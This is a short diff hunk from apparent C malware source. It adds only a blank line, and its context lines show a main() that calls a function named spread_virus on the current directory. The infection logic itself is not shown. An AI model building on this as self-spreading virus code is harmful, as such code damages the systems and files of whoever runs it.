@@ -49,6 +49,7 @@ void spread_virus(const char* directory) {
     closedir(dir);
 }
 
+
 int main() {
     spread_virus(".");
     return 0;
